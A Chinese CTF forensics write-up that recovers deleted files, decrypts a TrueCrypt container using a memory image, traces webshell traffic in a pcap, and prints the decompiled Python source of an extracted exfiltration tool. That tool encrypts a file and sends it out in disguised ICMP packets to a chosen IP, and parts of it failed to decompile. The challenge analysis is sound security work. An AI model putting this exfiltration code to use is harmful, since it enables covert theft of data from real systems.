<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e6%95%b0%e6%8d%ae%e6%81%a2%e5%a4%8d%e6%ba%af%e6%ba%902025%e6%95%b0%e4%bf%a1%e6%9d%af class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题面信息如下：</p><blockquote><p>背景：一家科技公司的运维⼈员在日常巡查的时候，发现⼀台服务器上出现了异常，这台服务器记录了许多重要的资料</p><p>初步排查下来后发现是黑客入侵了服务器并通过技术手段窃取了重要的文件资料。</p><p>现在公司找到你进行合作，请你根据系统自动保存下来的残存内容溯源整个攻击行为并找到泄露了那些文件资料。</p></blockquote><blockquote><ol><li>数据恢复</li></ol><p>黑客在攻击时，为了对公司造成更大的破坏，直接删除了磁盘中的⽂件。</p><p>但好在系统有自动的磁盘备份计划，保留了⼀个备份磁盘。</p><p>请你通过技术手段，恢复出黑客删除的⽂件。</p><p>[答案标准]</p><p>请找出删除的文件中的⼀个合同文件，提交合同编号。例：如果合同编号为flag{xx-xx-xx}，则最终提交答案为：xx-xx-xx</p></blockquote><blockquote><ol start=2><li>数据存储安全</li></ol><p>你通过技术手段恢复出黑客删除的文件后，发现存在加密文件，但是管理员忘记了密钥</p><p>但经验丰富的你知道可以绕开验证直接读取加密文件中的内容。请你通过技术手段，读取加密内容。</p><p>[答案标准]</p><p>请读取加密文件中的密码本，提交密码本中的内容。例：如果密码本中的内容为flag{xxxxxx}，则最终提交答案为：xxxxxx</p></blockquote><blockquote><ol start=3><li>流量分析
你在破解开加密文件后，发现加密文件中存放着⼀个流量包，通过分析你发现流量包中记录着黑客攻击时产生的流量信息。你需要分析流量包，找出泄露的内容。</li></ol><p>[答案标准]</p><p>请读取泄露的内容，提交手机号为：18316978925的家庭住址信息</p><p>例：手机号18316978925的家庭住址为：四川省成都市锦江区学府路159号和谐苑23栋5单元22室</p><p>则最终提交答案为：四川省成都市锦江区学府路159号和谐苑23栋5单元22室</p></blockquote><p>附件给了一个disk.img，我们可以拿Diskgenius挂载并尝试恢复文件</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113105608075.png alt=/posts/bb1da35/imgs/image-20260113105608075.png height=972 width=1822></p><p>恢复后可以得到一个PDF文件，打开后内容如下：</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113105644854.png alt=/posts/bb1da35/imgs/image-20260113105644854.png height=1323 width=2095></p><p>因此第一题的答案为：<code>HT-2025-001234</code></p><p>然后我们继续看恢复的文件，发现还有一个zip</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113105837947.png alt=/posts/bb1da35/imgs/image-20260113105837947.png height=972 width=1822></p><p>解压后可以得到一个 WIN-SERVER-PC-20251202-122722.raw</p><p>然后我们直接拿010搜索<code>flag{</code>即可得到第二题的答案：<code>33c3789a36bb61beb6d4268cd7d13038</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113105952417.png alt=/posts/bb1da35/imgs/image-20260113105952417.png height=1260 width=1919></p><p>然后这里用DiskGenius恢复出来的zip其实有点问题，解压的时候可能会报错，但是问题不大</p><p>不过这里推荐的还是用R-Studio来扫码disk.iso，因为DiskGenius会扫不出来这个data文件(其实是个TrueCrypt的加密容器)</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113111402527.png alt=/posts/bb1da35/imgs/image-20260113111402527.png height=1038 width=2037></p><p>那个raw是个内存镜像文件，然后现在我们手上有了内存镜像和加密容器，就可以用PasswareKit从内存中扫描密钥对加密容器进行解密</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113111514081.png alt=/posts/bb1da35/imgs/image-20260113111514081.png height=1158 width=1560></p><p>解密完后，我们用R-Studio打开解密后的容器并扫描即可</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113150718771.png alt=/posts/bb1da35/imgs/image-20260113150718771.png height=1116 width=1758></p><p><code>congratulations!.txt</code>和<code>密码本.txt</code>中是我们之前第二题的答案，两个文件中的内容是一样的</p><p><code>challenge.zip</code>解压后可以得到一个<code>challenge.pcap</code>，翻看一下流量包，定位到木马文件为：<code>/images/article/a.php</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113152632797.png alt=/posts/bb1da35/imgs/image-20260113152632797.png height=1537 width=2234></p><p>看了一下响应中数据的特征，应该是菜刀的流量了</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113152800957.png alt=/posts/bb1da35/imgs/image-20260113152800957.png height=1537 width=2234></p><p>这里因为响应的内容直接是明文的，所以我们可以过滤并导出访问<code>/images/article/a.php</code>的所有流量</p><p>然后直接追踪流一个个查看，但是看完后发现也没有找到泄露的地址，因此猜测不在这里</p><p>继续回头去看最原始的流量包，发现最后一个http流get了一个exe文件</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113160423233.png alt=/posts/bb1da35/imgs/image-20260113160423233.png height=1537 width=2234></p><p>直接用wireshark导出，导出后发现是一个Python打包的exe</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113160507896.png alt=/posts/bb1da35/imgs/image-20260113160507896.png height=1537 width=2234></p><p>因此我们直接用<code>pyinstxtractor</code>解包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113160807014.png alt=/posts/bb1da35/imgs/image-20260113160807014.png height=927 width=1719></p><p>然后反编译一下pyc文件，这里用在线网站或者uncompyle6都行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>sqrt</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span><span class=p>,</span> <span class=n>ChaCha20_Poly1305</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Protocol.KDF</span> <span class=kn>import</span> <span class=n>PBKDF2</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Random</span> <span class=kn>import</span> <span class=n>get_random_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=n>IP</span><span class=p>,</span> <span class=n>ICMP</span><span class=p>,</span> <span class=n>send</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ObfuscatedCrypto</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>master_seed</span> <span class=o>=</span> <span class=p>(</span><span class=kc>None</span><span class=p>,)):</span>
</span></span><span class=line><span class=cl><span class=n>Unsupported</span> <span class=n>opcode</span><span class=p>:</span> <span class=n>POP_JUMP_IF_NOT_NONE</span> <span class=p>(</span><span class=mi>238</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=c1># WARNING: Decompyle incomplete</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_init_keys</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>base_material</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>master_seed</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>_k1</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>key_layer1</span> <span class=o>=</span> <span class=n>PBKDF2</span><span class=p>(</span><span class=n>base_material</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>_k2</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>dkLen</span> <span class=o>=</span> <span class=mi>32</span><span class=p>,</span> <span class=n>count</span> <span class=o>=</span> <span class=mi>10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>key_layer2</span> <span class=o>=</span> <span class=n>PBKDF2</span><span class=p>(</span><span class=n>base_material</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>key_layer1</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>_k2</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x02</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>dkLen</span> <span class=o>=</span> <span class=mi>32</span><span class=p>,</span> <span class=n>count</span> <span class=o>=</span> <span class=mi>10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>encrypt_data</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>plaintext</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>length_header</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>plaintext</span><span class=p>)</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data_with_header</span> <span class=o>=</span> <span class=n>length_header</span> <span class=o>+</span> <span class=n>plaintext</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher1</span> <span class=o>=</span> <span class=n>ChaCha20_Poly1305</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>key_layer1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>nonce1</span> <span class=o>=</span> <span class=n>cipher1</span><span class=o>.</span><span class=n>nonce</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>ct1</span><span class=p>,</span> <span class=n>tag1</span><span class=p>)</span> <span class=o>=</span> <span class=n>cipher1</span><span class=o>.</span><span class=n>encrypt_and_digest</span><span class=p>(</span><span class=n>data_with_header</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>layer1_result</span> <span class=o>=</span> <span class=n>nonce1</span> <span class=o>+</span> <span class=n>tag1</span> <span class=o>+</span> <span class=n>ct1</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher2</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>key_layer2</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_GCM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>nonce2</span> <span class=o>=</span> <span class=n>cipher2</span><span class=o>.</span><span class=n>nonce</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>ct2</span><span class=p>,</span> <span class=n>tag2</span><span class=p>)</span> <span class=o>=</span> <span class=n>cipher2</span><span class=o>.</span><span class=n>encrypt_and_digest</span><span class=p>(</span><span class=n>layer1_result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>layer2_result</span> <span class=o>=</span> <span class=n>nonce2</span> <span class=o>+</span> <span class=n>tag2</span> <span class=o>+</span> <span class=n>ct2</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>layer2_result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_master_seed</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>master_seed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>EnhancedScrambler</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>scramble_seed</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>seed</span> <span class=o>=</span> <span class=n>scramble_seed</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>rng</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>Random</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>shuffle_table</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_generate_shuffle_table</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_generate_shuffle_table</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>table</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>rng</span><span class=o>.</span><span class=n>shuffle</span><span class=p>(</span><span class=n>table</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>table</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_apply_transform</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>index</span><span class=p>,</span> <span class=n>total_count</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>step1</span> <span class=o>=</span> <span class=p>(</span><span class=n>index</span> <span class=o>*</span> <span class=mi>17</span> <span class=o>+</span> <span class=mi>23</span><span class=p>)</span> <span class=o>%</span> <span class=n>total_count</span>
</span></span><span class=line><span class=cl>        <span class=n>step2</span> <span class=o>=</span> <span class=p>(</span><span class=n>step1</span> <span class=o>^</span> <span class=n>total_count</span> <span class=o>-</span> <span class=n>index</span><span class=p>)</span> <span class=o>%</span> <span class=n>total_count</span>
</span></span><span class=line><span class=cl>        <span class=n>step3</span> <span class=o>=</span> <span class=p>(</span><span class=n>step2</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>shuffle_table</span><span class=p>[</span><span class=n>index</span> <span class=o>%</span> <span class=mi>256</span><span class=p>])</span> <span class=o>%</span> <span class=n>total_count</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>step3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>scramble_chunks</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>chunks</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>total</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>chunks</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>scrambled</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>new_idx</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>total</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>original_idx</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_apply_transform</span><span class=p>(</span><span class=n>new_idx</span><span class=p>,</span> <span class=n>total</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>scrambled</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>new_idx</span><span class=p>,</span> <span class=n>original_idx</span><span class=p>,</span> <span class=n>chunks</span><span class=p>[</span><span class=n>original_idx</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>scrambled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_seed</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>seed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>StealthICMP</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>target_ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>target</span> <span class=o>=</span> <span class=n>target_ip</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>build_packet</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=n>metadata</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>chunk_idx</span><span class=p>,</span> <span class=n>total_chunks</span><span class=p>,</span> <span class=n>extra</span><span class=p>)</span> <span class=o>=</span> <span class=n>metadata</span>
</span></span><span class=line><span class=cl>        <span class=n>icmp_id</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_calc_id</span><span class=p>(</span><span class=n>chunk_idx</span><span class=p>,</span> <span class=n>total_chunks</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>icmp_seq</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_calc_seq</span><span class=p>(</span><span class=n>chunk_idx</span><span class=p>,</span> <span class=n>total_chunks</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>prefix</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_get_ping_prefix</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>packet_data</span> <span class=o>=</span> <span class=n>prefix</span> <span class=o>+</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>        <span class=n>ip</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>icmp</span> <span class=o>=</span> <span class=n>ICMP</span><span class=p>(</span><span class=nb>type</span> <span class=o>=</span> <span class=mi>8</span><span class=p>,</span> <span class=n>code</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>id</span> <span class=o>=</span> <span class=n>icmp_id</span><span class=p>,</span> <span class=n>seq</span> <span class=o>=</span> <span class=n>icmp_seq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pkt</span> <span class=o>=</span> <span class=n>ip</span> <span class=o>/</span> <span class=n>icmp</span> <span class=o>/</span> <span class=n>packet_data</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>pkt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_calc_id</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>idx</span><span class=p>,</span> <span class=n>total</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>*</span> <span class=mh>0x9E3779B9</span> <span class=o>+</span> <span class=mi>305419896</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span> <span class=o>&amp;</span> <span class=mi>65535</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_calc_seq</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>idx</span><span class=p>,</span> <span class=n>total</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>*</span> <span class=mh>0x9E3779B9</span> <span class=o>+</span> <span class=mi>305419896</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mi>65535</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_get_ping_prefix</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>prefixes</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s1>&#39;abcdefghijklmnop&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s1>&#39;qrstuvwabcdefghi&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nb>bytes</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>prefixes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>BalancedExfiltrator</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>target_ip</span><span class=p>,</span> <span class=n>chunk_size</span> <span class=o>=</span> <span class=p>(</span><span class=mi>224</span><span class=p>,)):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>target_ip</span> <span class=o>=</span> <span class=n>target_ip</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>chunk_size</span> <span class=o>=</span> <span class=n>chunk_size</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>crypto_seed</span> <span class=o>=</span> <span class=n>get_random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>crypto</span> <span class=o>=</span> <span class=n>ObfuscatedCrypto</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>crypto_seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>timestamp</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>scramble_seed</span> <span class=o>=</span> <span class=n>timestamp</span> <span class=o>&amp;</span> <span class=mi>16777215</span> <span class=o>^</span> <span class=mi>4342338</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>scrambler</span> <span class=o>=</span> <span class=n>EnhancedScrambler</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>scramble_seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>icmp_builder</span> <span class=o>=</span> <span class=n>StealthICMP</span><span class=p>(</span><span class=n>target_ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>exfiltrate</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>filepath</span><span class=p>):</span>
</span></span><span class=line><span class=cl><span class=n>Unsupported</span> <span class=n>opcode</span><span class=p>:</span> <span class=n>BEFORE_WITH</span> <span class=p>(</span><span class=mi>108</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#39;&#39;[*] Target: </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>target_ip</span><span class=si>}</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#39;&#39;[*] File: </span><span class=si>{</span><span class=n>filepath</span><span class=si>}</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># WARNING: Decompyle incomplete</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Usage: exfiltrator_balanced.exe &lt;target_ip&gt; &lt;file&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
